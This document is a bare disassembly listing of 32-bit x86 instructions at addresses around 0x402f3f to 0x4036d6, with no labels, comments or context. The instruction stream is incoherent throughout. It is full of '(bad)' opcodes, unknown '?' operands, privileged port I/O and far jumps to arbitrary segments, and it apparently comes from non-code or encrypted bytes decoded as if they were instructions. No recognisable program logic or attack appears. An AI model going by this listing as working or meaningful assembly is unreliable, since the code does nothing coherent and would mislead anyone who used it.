  402f3f:	out    dx,al
  402f40:	mov    edi,0x1597f636
  402f45:	fcmovnu st,st(5)
  402f47:	clc    
  402f48:	pushf  
  402f49:	fidiv  WORD PTR [edx-0x11]
  402f4c:	popa   
  402f4d:	fisub  DWORD PTR [edx+0x5f]
  402f50:	daa    
  402f51:	and    BYTE PTR [edi+ebx*1+0x74],bh
  402f55:	scas   eax,DWORD PTR es:[edi]
  402f56:	retf   0x4534
  402f59:	adc    bl,BYTE PTR [ebx-0x7c]
  402f5c:	add    ebp,ebp
  402f5e:	pop    ecx
  402f5f:	scas   al,BYTE PTR es:[edi]
  402f60:	cmc    
  402f61:	in     eax,dx
  402f62:	sub    DWORD PTR [ebx],edx
  402f64:	in     eax,0x13
  402f66:	jbe    0x402f8d
  402f68:	int    0xea
  402f6a:	jle    0x402fa5
  402f6c:	neg    DWORD PTR [ebp+0x3801527e]
  402f72:	mov    ah,0x41
  402f74:	mov    ebx,0x745cddaf
  402f79:	sub    cl,BYTE PTR ds:0x6182c784
  402f7f:	mov    dh,0x4d
  402f81:	pop    ebx
  402f82:	and    al,0x4a
  402f84:	fadd   QWORD PTR [edi-0x3ff94efe]
  402f8a:	or     BYTE PTR [ecx-0x33],ch
  402f8d:	fs daa 
  402f8f:	mov    ebp,esi
  402f91:	mov    al,0x24
  402f93:	cmc    
  402f94:	pusha  
  402f95:	div    bh
  402f97:	(bad)  [ecx-0x22d53a4c]
  402f9d:	stos   DWORD PTR es:[edi],eax
  402f9e:	aad    0xe8
  402fa0:	lods   eax,DWORD PTR ds:[esi]
  402fa1:	cli    
  402fa2:	inc    eax
  402fa3:	xchg   edx,eax
  402fa4:	ror    BYTE PTR [ebp-0x3d],0x2c
  402fa8:	or     eax,0x4f517fcb
  402fad:	inc    ecx
  402fae:	inc    edi
  402faf:	push   cs
  402fb0:	xchg   DWORD PTR [edi],ebp
  402fb2:	mov    ah,0x37
  402fb4:	loop   0x402f81
  402fb6:	adc    DWORD PTR [esi+eax*4-0x187fccf7],edi
  402fbd:	repz dec eax
  402fbf:	in     al,dx
  402fc0:	mov    esi,0x70b319af
  402fc5:	pop    ebx
  402fc6:	or     ebx,DWORD PTR [edi]
  402fc8:	xor    al,0xb
  402fca:	jns    0x402f9b
  402fcc:	(bad)  
  402fce:	rcl    BYTE PTR [edx],1
  402fd0:	fnsetpm(287 only) 
  402fd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fd3:	shr    BYTE PTR [esi],0x85
  402fd6:	mov    dl,0xaa
  402fd8:	aas    
  402fd9:	mov    ch,0x8d
  402fdb:	inc    eax
  402fdc:	scas   al,BYTE PTR es:[edi]
  402fdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fdf:	loopne 0x402fad
  402fe1:	test   al,0x24
  402fe3:	or     al,0x9c
  402fe5:	xchg   edx,eax
  402fe6:	push   0xc5b13965
  402feb:	pop    ecx
  402fec:	out    0xd1,al
  402fee:	ds mov dh,0x3c
  402ff1:	cs into 
  402ff3:	add    BYTE PTR [ebp+0x7b3773f7],dh
  402ff9:	pop    edi
  402ffa:	jmp    0x403062
  402ffc:	out    0x89,eax
  402ffe:	inc    esi
  402fff:	cmp    edx,DWORD PTR [esi-0x32c9338c]
  403005:	push   ds
  403006:	cmp    BYTE PTR [edx],bl
  403008:	jbe    0x402fee
  40300a:	add    al,0x48
  40300c:	lahf   
  40300d:	push   eax
  40300e:	sub    DWORD PTR [esi-0x18],eax
  403011:	retf   
  403012:	pop    ebp
  403013:	jbe    0x40302b
  403015:	idiv   dl
  403017:	sub    esi,DWORD PTR [edx+eax*8-0x5b44423f]
  40301e:	push   ebp
  40301f:	push   ecx
  403020:	lods   eax,DWORD PTR ds:[esi]
  403021:	arpl   dx,ax
  403023:	jmp    0x52a2:0x45270ac4
  40302a:	and    WORD PTR [ecx+0x1eb8ca26],bp
  403031:	pop    esi
  403032:	add    ebx,DWORD PTR [eax-0xe6bd4d2]
  403038:	test   DWORD PTR [edi-0x20],edi
  40303b:	sub    DWORD PTR [eax-0x2f],esi
  40303e:	push   ecx
  40303f:	lock sub al,bh
  403042:	and    DWORD PTR [ebx],ebx
  403044:	rcr    BYTE PTR [esi],cl
  403046:	cmp    DWORD PTR [ebx],esi
  403048:	push   ss
  403049:	inc    esi
  40304a:	and    eax,0x704ffb5f
  40304f:	sahf   
  403050:	aas    
  403051:	or     al,dh
  403053:	xchg   esp,edx
  403055:	loopne 0x40301c
  403057:	gs push ss
  403059:	fs pop esi
  40305b:	ret    0x8463
  40305e:	pushf  
  40305f:	shl    bl,0x6d
  403062:	ss dec ebx
  403064:	pusha  
  403065:	mov    ebp,es
  403067:	stos   BYTE PTR es:[edi],al
  403068:	and    eax,0x42a33947
  40306d:	jae    0x4030ea
  40306f:	mov    al,ds:0xb27b3b82
  403074:	xor    bh,BYTE PTR [esi]
  403076:	jno    0x4030c2
  403078:	ror    BYTE PTR [ecx-0x70b0c106],1
  40307e:	add    bl,BYTE PTR [esi-0x11979157]
  403084:	push   cs
  403085:	adc    eax,0xa3917bef
  40308a:	mov    dl,0x32
  40308c:	cwde   
  40308d:	in     al,dx
  40308e:	daa    
  40308f:	bound  ebp,QWORD PTR [ebx-0x2b]
  403092:	into   
  403093:	sbb    BYTE PTR ds:[esi+0xdd87274],al
  40309a:	cli    
  40309b:	inc    esp
  40309c:	add    eax,0xf614ee1d
  4030a1:	je     0x4030a4
  4030a3:	jbe    0x4030fb
  4030a5:	ret    0xcfd1
  4030a8:	shr    BYTE PTR [ebx],cl
  4030aa:	int    0xe5
  4030ac:	xchg   esp,eax
  4030ad:	jno    0x403118
  4030af:	dec    ebx
  4030b0:	dec    ecx
  4030b1:	es test al,0xf5
  4030b4:	inc    edx
  4030b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030b6:	xor    DWORD PTR [edx+ecx*8],edi
  4030b9:	stc    
  4030ba:	stos   DWORD PTR es:[edi],eax
  4030bb:	mov    eax,?
  4030bd:	mov    edi,0xc3139437
  4030c2:	add    bh,BYTE PTR [edx+0x4bc7b5]
  4030c8:	and    DWORD PTR es:[edi],ebp
  4030cb:	inc    edi
  4030cc:	add    dh,BYTE PTR [ebx]
  4030ce:	mov    ch,BYTE PTR [ebx+esi*2-0x14d5c15f]
  4030d5:	jge    0x4030c9
  4030d7:	mov    bh,0x18
  4030d9:	leave  
  4030da:	or     al,0x42
  4030dc:	sbb    dl,dh
  4030de:	(bad)  
  4030df:	cmp    eax,0xa665ad7f
  4030e4:	popfw  
  4030e6:	add    BYTE PTR [edi-0x7d],ah
  4030e9:	je     0x403130
  4030eb:	std    
  4030ec:	ja     0x40315e
  4030ee:	mov    BYTE PTR [ebx+0x37],cl
  4030f1:	push   cs
  4030f2:	imul   esp,DWORD PTR [edi-0x11],0x1
  4030f6:	jne    0x4030ae
  4030f8:	std    
  4030f9:	adc    BYTE PTR [edx-0x75],0x45
  4030fd:	and    eax,0x9b284127
  403102:	mov    ch,0x8e
  403104:	inc    ebp
  403105:	sahf   
  403106:	stos   DWORD PTR es:[edi],eax
  403107:	sahf   
  403108:	xchg   ebx,eax
  403109:	(bad)  
  40310a:	loope  0x4030a3
  40310c:	das    
  40310d:	inc    esp
  40310e:	stos   DWORD PTR es:[edi],eax
  40310f:	xchg   ebx,eax
  403110:	in     al,dx
  403111:	cli    
  403112:	fnstcw WORD PTR [eax]
  403114:	sbb    eax,0x6076ad72
  403119:	retf   
  40311a:	and    ebp,DWORD PTR [edx]
  40311c:	stos   DWORD PTR es:[edi],eax
  40311d:	push   eax
  40311e:	sub    esi,ecx
  403120:	mov    esi,0xa19ad690
  403125:	inc    ebp
  403126:	idiv   BYTE PTR [edx-0x4c]
  403129:	xchg   esi,eax
  40312a:	std    
  40312b:	(bad)  
  40312c:	mov    eax,0xc9daae72
  403131:	loope  0x40318d
  403133:	aas    
  403134:	jl     0x4031a9
  403136:	jge    0x403127
  403138:	stos   DWORD PTR es:[edi],eax
  403139:	sub    BYTE PTR [edi-0x1e5630bb],dl
  40313f:	add    eax,edx
  403141:	xor    edx,ebp
  403143:	cmp    cl,BYTE PTR [esi-0x17]
  403146:	scas   eax,DWORD PTR es:[edi]
  403147:	imul   edi,DWORD PTR [ecx],0xffffffbe
  40314a:	cmp    al,0xd1
  40314c:	dec    esp
  40314d:	xor    ah,BYTE PTR [ecx-0x621a09b]
  403153:	div    DWORD PTR [ecx+0x6db69280]
  403159:	ins    DWORD PTR es:[edi],dx
  40315a:	xchg   DWORD PTR [ebp+0xfeb7585],eax
  403160:	adc    al,0x75
  403162:	ret    0x60e8
  403165:	xchg   edx,eax
  403166:	sar    ecx,cl
  403168:	mov    ebp,0xf7f5dd5d
  40316d:	lahf   
  40316e:	addr16 int 0x95
  403171:	sub    eax,0xd1cb0345
  403176:	jb     0x403170
  403178:	nop
  403179:	in     eax,dx
  40317a:	(bad)  
  40317b:	(bad)  
  40317c:	mov    dh,0x6c
  40317e:	add    esp,0xffffffda
  403181:	ss jmp 0x40316c
  403184:	xchg   esp,eax
  403185:	cmp    edi,DWORD PTR [ebp-0x41]
  403188:	mov    ebp,0x869bfe2a
  40318d:	leave  
  40318e:	mov    bh,0xa7
  403190:	mov    ebp,0xfa440a8a
  403195:	lds    eax,FWORD PTR [edx+0x18670af3]
  40319b:	inc    eax
  40319c:	(bad)  
  40319d:	seto   BYTE PTR [eax]
  4031a0:	push   esp
  4031a1:	stc    
  4031a2:	push   0x49f6e6f7
  4031a7:	dec    edx
  4031a8:	fild   DWORD PTR [ebp+0x6e189fca]
  4031ae:	xor    al,0xf2
  4031b0:	aam    0x56
  4031b2:	xchg   DWORD PTR [edx+0x47],edi
  4031b5:	sti    
  4031b6:	xchg   esi,eax
  4031b7:	inc    ebx
  4031b8:	inc    ecx
  4031b9:	add    DWORD PTR [edi+0x6c],ebp
  4031bc:	int3   
  4031bd:	mov    WORD PTR [eax],cs
  4031bf:	jge    0x4031a2
  4031c1:	xchg   ebx,esi
  4031c3:	mov    ch,0x2b
  4031c5:	mov    cl,BYTE PTR [ebx]
  4031c7:	xor    dh,BYTE PTR [eax-0x13006e8]
  4031cd:	xchg   ebp,eax
  4031ce:	adc    al,0x2c
  4031d0:	fstp   DWORD PTR [edi]
  4031d2:	pushf  
  4031d3:	xchg   ecx,eax
  4031d4:	jl     0x4031fd
  4031d6:	repz mov ds:0x7d0d5a03,al
  4031dc:	js     0x40316d
  4031de:	pop    eax
  4031df:	scas   al,BYTE PTR es:[edi]
  4031e0:	sub    al,0xc
  4031e2:	stos   BYTE PTR es:[edi],al
  4031e3:	bound  edx,QWORD PTR [esi+0x23]
  4031e6:	xor    BYTE PTR [ebp+0x39],al
  4031e9:	mov    ecx,0x38f5ddb6
  4031ee:	in     eax,0x44
  4031f0:	leave  
  4031f1:	cli    
  4031f2:	fwait
  4031f3:	adc    eax,0xe75ee666
  4031f8:	push   edi
  4031f9:	push   ebp
  4031fa:	int    0x3a
  4031fc:	inc    ebx
  4031fd:	outs   dx,DWORD PTR ds:[esi]
  4031ff:	imul   esi,ecx,0x9658625d
  403205:	ds test dl,cl
  403208:	fld    st(2)
  40320a:	sbb    BYTE PTR [eax+0x1d],al
  40320d:	addr16 jg 0x40325f
  403210:	and    esp,DWORD PTR gs:[ebp+0x1e22881f]
  403217:	xchg   edx,eax
  403218:	mov    ds:0xf875c1d,eax
  40321d:	jecxz  0x403213
  40321f:	ja     0x4031e1
  403221:	imul   ecx,DWORD PTR [edi+0x72],0xce208e83
  403228:	cmp    al,0xb5
  40322a:	cwde   
  40322b:	ret    
  40322c:	and    ch,BYTE PTR [eax-0x13]
  40322f:	retf   
  403230:	xor    ebx,ebx
  403232:	nop
  403233:	jg     0x40322d
  403235:	mov    dh,0x91
  403237:	(bad)
  40323a:	mov    WORD PTR [esi+0x7a16a54e],fs
  403240:	aas    
  403241:	(bad)  
  403242:	loope  0x403273
  403244:	xchg   ebp,eax
  403245:	stc    
  403246:	pop    ss
  403247:	movd   mm1,DWORD PTR [ebx]
  40324a:	pop    es
  40324b:	sub    DWORD PTR [edi-0x5a],eax
  40324e:	data16 sub dl,BYTE PTR [ebp*2-0x44e946c1]
  403256:	sti    
  403257:	add    bh,al
  403259:	push   esp
  40325a:	xor    edx,DWORD PTR [ecx-0x2c4b733e]
  403260:	data16 or al,0xaf
  403263:	mov    ds:0xdbc16e6b,eax
  403268:	push   ss
  403269:	loopne 0x4031f1
  40326b:	or     eax,0x7e12c379
  403270:	jle    0x4032ab
  403272:	aaa    
  403273:	(bad)  
  403274:	loop   0x403200
  403276:	stos   BYTE PTR es:[edi],al
  403277:	lods   eax,DWORD PTR ds:[esi]
  403278:	sub    eax,0xb846ec99
  40327d:	pop    ds
  40327e:	test   al,0x1d
  403280:	adc    ch,BYTE PTR gs:[esi-0x13]
  403284:	inc    ecx
  403285:	sbb    ebx,edi
  403287:	mov    BYTE PTR [ebx],cl
  403289:	or     al,0xa8
  40328b:	inc    eax
  40328c:	or     eax,0x174dca3e
  403291:	jl     0x4032be
  403293:	xor    al,dl
  403295:	cld    
  403296:	cmp    BYTE PTR [esi+0x55],ah
  403299:	mov    cl,BYTE PTR [edi]
  40329b:	mov    ch,0x77
  40329d:	or     eax,0x55a60473
  4032a2:	sub    al,0xb8
  4032a4:	pop    ecx
  4032a5:	push   edx
  4032a6:	pop    ecx
  4032a7:	mov    esi,0x89971e6e
  4032ac:	cwde   
  4032ad:	test   eax,0x9f14622
  4032b2:	outs   dx,BYTE PTR ds:[esi]
  4032b3:	in     eax,dx
  4032b4:	popf   
  4032b5:	ret    0xc2a
  4032b8:	pop    edx
  4032b9:	in     ax,dx
  4032bb:	fxch   st(5)
  4032bd:	dec    ebp
  4032be:	and    BYTE PTR [eax],dl
  4032c0:	sbb    eax,0x92d8014e
  4032c5:	hlt    
  4032c6:	and    ch,cl
  4032c8:	dec    esi
  4032c9:	xor    bl,bl
  4032cb:	in     al,0xf2
  4032cd:	inc    ebp
  4032ce:	jbe    0x4032cf
  4032d0:	jg     0x40326e
  4032d2:	cmp    dh,cl
  4032d4:	scas   eax,DWORD PTR es:[edi]
  4032d5:	rol    esi,1
  4032d7:	ja     0x40332c
  4032d9:	mov    dl,0x75
  4032db:	mov    ds,WORD PTR [edx+ebx*2-0x8]
  4032df:	add    BYTE PTR [ecx],bh
  4032e1:	cdq    
  4032e2:	xchg   esi,eax
  4032e3:	pcmpeqd mm5,mm3
  4032e6:	(bad)  [edi+0x7cf1cbb9]
  4032ec:	retf   0xc91
  4032ef:	sbb    DWORD PTR [ecx+0x5e],ecx
  4032f2:	jmp    0xd349:0xc0a172db
  4032f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032fa:	mov    cl,0xeb
  4032fc:	imul   eax,DWORD PTR [ecx],0xd2d58d78
  403302:	or     al,ch
  403304:	lahf   
  403305:	fldcw  WORD PTR [ecx+0x6c46175e]
  40330b:	rol    DWORD PTR ds:0x5b379281,cl
  403311:	pop    ds
  403312:	mov    al,BYTE PTR [ecx]
  403314:	mov    fs,WORD PTR [ebx-0x57bab9db]
  40331a:	int    0xb3
  40331c:	mov    ?,WORD PTR [ecx+0x1c3235bc]
  403322:	(bad)  
  403323:	mov    ch,0x4f
  403325:	push   cs
  403326:	les    edx,FWORD PTR [ebx]
  403328:	mov    dh,0x18
  40332a:	daa    
  40332b:	stos   DWORD PTR es:[edi],eax
  40332c:	into   
  40332d:	(bad)  
  40332e:	xchg   edx,eax
  40332f:	push   ebp
  403330:	fidiv  WORD PTR [edx]
  403332:	xor    BYTE PTR [esi-0x2fc07be8],bh
  403338:	push   ecx
  403339:	cmp    BYTE PTR [esi-0x1e08a10f],bh
  40333f:	mov    ah,0xe6
  403341:	dec    ebx
  403342:	mov    ch,0xc6
  403344:	sub    DWORD PTR [edx-0x4e4497cc],edx
  40334a:	pop    esp
  40334b:	xor    al,0xe1
  40334d:	jecxz  0x40338b
  40334f:	loop   0x4032e1
  403351:	pop    ebx
  403352:	test   al,0x44
  403354:	(bad)  
  403355:	xchg   ebx,eax
  403356:	adc    DWORD PTR [ebx],ecx
  403358:	pop    eax
  403359:	retf   
  40335a:	shr    DWORD PTR [edi],cl
  40335c:	xchg   esi,eax
  40335d:	repnz retf 
  40335f:	shl    DWORD PTR gs:[eax],1
  403362:	cmp    esp,eax
  403364:	rcr    DWORD PTR [ebx-0x21],0x9c
  403368:	pop    ebp
  403369:	xor    al,0xd6
  40336b:	mov    ebp,0x446661dd
  403370:	xchg   esi,eax
  403371:	jno    0x4033d3
  403373:	cld    
  403374:	outs   dx,DWORD PTR ds:[esi]
  403375:	jo     0x4033e4
  403377:	mov    ah,0xc6
  403379:	sbb    eax,0x1f7efffe
  40337e:	outs   dx,DWORD PTR ds:[esi]
  40337f:	dec    ebp
  403380:	pop    eax
  403381:	cmp    al,BYTE PTR [esi-0x298cbff9]
  403387:	shr    BYTE PTR [esi-0x5b6bdbf3],1
  40338d:	mov    ds:0x62de4237,eax
  403392:	xchg   edi,eax
  403393:	mov    al,0xa3
  403395:	cmp    BYTE PTR [ecx-0x76298fe5],bl
  40339b:	or     cl,cl
  40339d:	adc    al,BYTE PTR [edi+0x3dbafd1b]
  4033a3:	sahf   
  4033a4:	test   al,0x1d
  4033a6:	repnz and ebp,DWORD PTR [edx+edi*2-0x65c3344c]
  4033ae:	enter  0xbb46,0x88
  4033b2:	std    
  4033b3:	repz loopne 0x403428
  4033b6:	dec    ebp
  4033b7:	adc    esp,DWORD PTR [edi-0x30]
  4033ba:	push   ebx
  4033bb:	xor    al,0xf1
  4033bd:	mov    eax,ss:0x8c680d3d
  4033c3:	adc    ebx,esi
  4033c5:	repz jno 0x403384
  4033c8:	mov    ds:0xd82a4259,al
  4033cd:	push   eax
  4033ce:	xor    BYTE PTR [edi],dl
  4033d0:	imul   DWORD PTR [ecx*2+0x6bf22b9b]
  4033d7:	xchg   esi,eax
  4033d8:	jnp    0x40335f
  4033da:	xor    cl,BYTE PTR [edi+0x3063bb40]
  4033e0:	out    dx,eax
  4033e1:	das    
  4033e2:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4033e4:	das    
  4033e5:	add    eax,0xa71bc24a
  4033ea:	lods   al,BYTE PTR ds:[esi]
  4033eb:	cdq    
  4033ec:	mov    eax,0x9ee279f5
  4033f1:	sahf   
  4033f2:	call   0x1cb3:0x61d243d1
  4033f9:	out    0x21,al
  4033fb:	jl     0x40344b
  4033fd:	jnp    0x4033f8
  4033ff:	jbe    0x40341b
  403401:	sub    DWORD PTR [ecx+0x79756690],0xffffffb6
  403408:	add    DWORD PTR [edx],ecx
  40340a:	loopne 0x403427
  40340c:	imul   edx,DWORD PTR [ebx+0x3f],0x56
  403410:	in     al,0xc
  403412:	sub    BYTE PTR [edx-0x5d],bh
  403415:	and    DWORD PTR [edx+0x693d919d],esp
  40341b:	cmp    ah,al
  40341d:	mov    DWORD PTR [eax],esp
  40341f:	push   0xeb9079b2
  403424:	ret    0x1a3d
  403427:	ins    BYTE PTR es:[edi],dx
  403428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403429:	xchg   ebp,eax
  40342a:	call   0x1fbcc32e
  40342f:	(bad)  
  403430:	outs   dx,BYTE PTR ds:[esi]
  403431:	mov    dh,BYTE PTR ds:0x8ce741f2
  403437:	mov    DWORD PTR [edx+esi*4],esi
  40343a:	cmp    al,0xd7
  40343c:	mov    bh,0x94
  40343e:	fcmovne st,st(2)
  403440:	pop    ebx
  403441:	mov    edi,0xdc168c8f
  403446:	pop    edi
  403447:	nop
  403448:	in     al,0xe5
  40344a:	fs ins BYTE PTR es:[edi],dx
  40344c:	lds    esp,FWORD PTR [ebp+0x33358fca]
  403452:	aaa    
  403453:	icebp  
  403454:	ret    0xf475
  403457:	inc    eax
  403458:	fs (bad) 
  40345a:	jecxz  0x4034c2
  40345c:	inc    edx
  40345d:	dec    eax
  40345e:	hlt    
  40345f:	jmp    0x1aae5da3
  403464:	xchg   ebp,eax
  403465:	pusha  
  403466:	repnz neg BYTE PTR [ebx+0x56]
  40346a:	lods   al,BYTE PTR ds:[esi]
  40346b:	sbb    eax,0xcc531704
  403470:	pop    ecx
  403471:	icebp  
  403472:	cmp    DWORD PTR [edi],esi
  403474:	rcr    BYTE PTR [ebx],1
  403476:	fdivr  QWORD PTR [edi+0x713c7958]
  40347c:	std    
  40347d:	cdq    
  40347e:	ja     0x403499
  403480:	neg    bl
  403482:	daa    
  403483:	fwait
  403484:	je     0x403411
  403486:	cmc    
  403487:	ins    BYTE PTR es:[edi],dx
  403488:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40348a:	loopne 0x4034a4
  40348c:	leave  
  40348d:	dec    BYTE PTR [edx]
  40348f:	rep stos BYTE PTR es:[edi],al
  403491:	aam    0xbc
  403493:	mov    al,ds:0x3c5a97fb
  403498:	xor    BYTE PTR [ebx+eiz*2-0x25d7393a],bh
  40349f:	xchg   edx,eax
  4034a0:	ret    
  4034a1:	mov    esi,0x3af631a2
  4034a6:	mov    dl,0xe7
  4034a8:	jae    0x403485
  4034aa:	push   esi
  4034ab:	adc    edi,ebx
  4034ad:	ins    BYTE PTR es:[edi],dx
  4034ae:	vmovhpd xmm2,xmm1,QWORD PTR [ebp+0x7d9a121b]
  4034b6:	sbb    BYTE PTR [eax],ch
  4034b8:	jnp    0x40351a
  4034ba:	jge    0x403477
  4034bc:	pusha  
  4034bd:	push   es
  4034be:	or     BYTE PTR [eax-0x7096c754],cl
  4034c4:	(bad)  
  4034c5:	lea    eax,[edi+0x45]
  4034c8:	mov    al,0xa8
  4034ca:	jmp    0x2e605023
  4034cf:	popa   
  4034d0:	cmp    cl,BYTE PTR [ebp-0x177f1586]
  4034d6:	outs   dx,BYTE PTR ds:[esi]
  4034d7:	cmp    BYTE PTR [ebp-0x2f1d992b],al
  4034dd:	push   edi
  4034de:	cwde   
  4034df:	cmp    al,0x8a
  4034e1:	push   edx
  4034e2:	aam    0x5c
  4034e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034e5:	pop    ss
  4034e6:	fsub   QWORD PTR [ebx-0x4369508]
  4034ec:	ins    DWORD PTR es:[edi],dx
  4034ed:	mov    edx,0xb84d9357
  4034f2:	mov    bl,BYTE PTR ds:0x98ac9440
  4034f8:	jo     0x4034d7
  4034fa:	imul   ebp,DWORD PTR ds:0xc7118679,0x583dcbc7
  403504:	xchg   ecx,eax
  403505:	(bad)  
  403506:	in     al,dx
  403507:	xchg   esp,eax
  403508:	inc    esi
  403509:	mov    eax,ds:0x4c96b362
  40350e:	mov    eax,ds:0xc2ba1b47
  403513:	outs   dx,BYTE PTR ds:[esi]
  403514:	popf   
  403515:	into   
  403516:	(bad)  
  403517:	dec    eax
  403518:	jbe    0x403501
  40351a:	inc    ebp
  40351b:	cmp    DWORD PTR [ebx],0x7f
  40351e:	cwde   
  40351f:	ss (bad) 
  403521:	pop    ecx
  403522:	shl    DWORD PTR [edx+ebp*1],0x83
  403526:	out    dx,al
  403527:	in     al,0x32
  403529:	mov    ch,0x3b
  40352b:	mov    edi,edx
  40352d:	xor    ebp,esi
  40352f:	pop    ds
  403530:	test   BYTE PTR [esi+0x69d3c75a],ch
  403536:	daa    
  403537:	outs   dx,DWORD PTR ds:[esi]
  403538:	cld    
  403539:	pop    DWORD PTR [edi-0x7b]
  40353c:	cwde   
  40353d:	in     al,dx
  40353e:	dec    esi
  40353f:	mov    ah,0x53
  403541:	sub    edi,esp
  403543:	outs   dx,BYTE PTR ds:[esi]
  403544:	test   al,0x12
  403546:	enter  0xf88,0x75
  40354a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40354b:	pop    ss
  40354c:	icebp  
  40354d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40354e:	fld    TBYTE PTR [ecx+ecx*4-0x7f9691e]
  403555:	ror    DWORD PTR [edi],1
  403557:	neg    DWORD PTR [edi]
  403559:	mov    esi,0x72203a99
  40355e:	adc    ebp,DWORD PTR [edx]
  403560:	call   0x40d0:0x66a4af60
  403567:	adc    eax,DWORD PTR [esi]
  403569:	push   cs
  40356a:	pop    esi
  40356b:	jns    0x403538
  40356d:	adc    BYTE PTR [ebx+0x39],cl
  403570:	or     BYTE PTR [eax],al
  403572:	jl     0x403578
  403574:	xor    DWORD PTR [edx+0x32],eax
  403577:	jnp    0x4035a4
  403579:	inc    edx
  40357a:	pop    ss
  40357b:	jmp    0xa75:0x450bee2
  403582:	push   esi
  403583:	mov    ds:0xab27bb9e,al
  403588:	pop    eax
  403589:	fisttp QWORD PTR [ebx+0x6]
  40358c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40358d:	pop    ebx
  40358e:	repz sub BYTE PTR [edx+ecx*4+0x32ffea82],bh
  403596:	and    eax,0xecff1a0e
  40359b:	xor    ah,BYTE PTR [edi-0x55b0ec0f]
  4035a1:	push   eax
  4035a2:	or     al,0xe5
  4035a4:	pop    ebp
  4035a5:	add    ebx,DWORD PTR [edi+0x23d132d1]
  4035ab:	xchg   edx,eax
  4035ac:	mov    bl,0x62
  4035ae:	xchg   BYTE PTR [edi],bl
  4035b0:	ds ins BYTE PTR es:[edi],dx
  4035b2:	xchg   ebp,eax
  4035b3:	mov    eax,0x989154a4
  4035b8:	mov    al,0xa5
  4035ba:	ret    0x14d5
  4035bd:	in     eax,0xa5
  4035bf:	dec    eax
  4035c0:	outs   dx,DWORD PTR ds:[esi]
  4035c1:	mov    eax,ds:0x73b759c8
  4035c6:	loop   0x403637
  4035c8:	cmp    bl,BYTE PTR [eax+0x5ff0d061]
  4035ce:	inc    esi
  4035cf:	in     al,0x2f
  4035d1:	sub    DWORD PTR [edi+0x5738d028],edx
  4035d7:	mov    esp,0x12f155d0
  4035dc:	inc    eax
  4035dd:	cmp    edi,DWORD PTR [eax+0x59]
  4035e0:	dec    edx
  4035e1:	inc    ecx
  4035e2:	mov    ah,0xe9
  4035e4:	push   ecx
  4035e5:	icebp  
  4035e6:	add    eax,DWORD PTR ds:0x1bb3560
  4035ec:	and    esp,DWORD PTR [ecx+0x4e85d5f2]
  4035f2:	adc    BYTE PTR [esi+eax*2],bl
  4035f5:	jmp    0x6bb05394
  4035fa:	mov    bh,0x27
  4035fc:	test   DWORD PTR [eax-0x686c2513],ebx
  403602:	push   esi
  403603:	out    dx,al
  403604:	xchg   ebx,eax
  403605:	and    bh,BYTE PTR es:[esi-0x32]
  403609:	xchg   edx,eax
  40360a:	outs   dx,BYTE PTR ds:[esi]
  40360b:	push   ebp
  40360c:	das    
  40360d:	mov    eax,ds:0xa1de16bf
  403612:	inc    ecx
  403613:	jne    0x403616
  403615:	cmp    DWORD PTR [ebp-0x77d15b27],eax
  40361b:	push   ebp
  40361c:	mov    ah,0xe3
  40361e:	pop    edi
  40361f:	stc    
  403620:	mov    bh,0x6f
  403622:	call   0x25a2:0x58a541a8
  403629:	inc    esp
  40362a:	stos   BYTE PTR es:[edi],al
  40362b:	mov    edi,0xcdf20f27
  403630:	mov    bh,0x43
  403632:	sub    cl,BYTE PTR [eax+ebx*8+0x25]
  403636:	sub    al,0x54
  403638:	mov    bh,0x1d
  40363a:	mov    bh,0x95
  40363c:	push   es
  40363d:	iret   
  40363e:	out    dx,eax
  40363f:	mov    edx,0x4661b5ee
  403644:	popf   
  403645:	add    edx,ebx
  403647:	vpsubusw xmm1,xmm3,xmm2
  40364b:	test   DWORD PTR [edi],0x26a506ce
  403651:	jns    0x403617
  403653:	fcomp  DWORD PTR [edx+ebx*2]
  403656:	mov    bh,0x58
  403658:	pop    eax
  403659:	mov    ds:0x8c136e9,al
  40365e:	icebp  
  40365f:	mov    ebx,0xb335efea
  403664:	jecxz  0x40368d
  403666:	xor    edi,DWORD PTR [eax+0x2b]
  403669:	call   0xb04b:0x9c1dfa90
  403670:	aad    0x6d
  403672:	mov    al,ds:0x9cfcd093
  403677:	jne    0x4036d9
  403679:	add    edx,DWORD PTR [edx]
  40367b:	push   0xffffffe2
  40367d:	repz pusha 
  40367f:	pop    edi
  403680:	adc    al,0x83
  403682:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403683:	jne    0x4036f2
  403685:	pop    eax
  403686:	adc    eax,0x2937a912
  40368b:	mov    DWORD PTR [ecx],0x196aeebe
  403691:	sbb    ebp,DWORD PTR [edx]
  403693:	cwde   
  403694:	mov    bh,0x7b
  403697:	daa    
  403698:	gs push cs
  40369a:	push   esp
  40369b:	mov    al,0xbd
  40369d:	or     ebp,esi
  40369f:	jg     0x40368e
  4036a1:	sbb    al,0x60
  4036a3:	mov    cl,0x20
  4036a5:	jae    0x4036be
  4036a7:	lods   al,BYTE PTR ds:[si]
  4036a9:	fidivr WORD PTR [edi+ecx*8]
  4036ac:	dec    esi
  4036ad:	hlt    
  4036ae:	push   eax
  4036af:	push   ss
  4036b0:	fidivr DWORD PTR [ecx]
  4036b2:	push   cs
  4036b3:	jbe    0x403681
  4036b5:	jne    0x40370a
  4036b7:	dec    esi
  4036b8:	pop    eax
  4036b9:	(bad)  
  4036bb:	idiv   DWORD PTR ds:0x295d1133
  4036c1:	cwde   
  4036c2:	es scas al,BYTE PTR es:[edi]
  4036c4:	jge    0x4036d5
  4036c6:	mov    ds:0x9df115e1,eax
  4036cb:	jnp    0x4036b5
  4036cd:	out    dx,al
  4036ce:	rol    DWORD PTR [eax+0x59],cl
  4036d1:	cmp    al,0x1a
  4036d3:	adc    cl,BYTE PTR [esi]
  4036d5:	stos   DWORD PTR es:[edi],eax
  4036d6:	mov    bl,0x8c
